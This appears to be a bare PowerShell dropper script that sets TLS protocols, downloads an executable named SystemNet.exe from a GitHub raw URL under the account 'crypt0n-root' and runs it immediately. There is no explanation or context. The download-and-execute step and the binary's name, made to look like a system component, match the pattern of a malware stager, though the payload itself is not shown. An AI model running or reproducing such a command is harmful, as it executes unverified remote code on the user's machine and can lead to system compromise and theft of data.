[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/crypt0n-root/systemdll/SystemNet.exe' -OutFile SystemNet.exe

.\SystemNet.exe
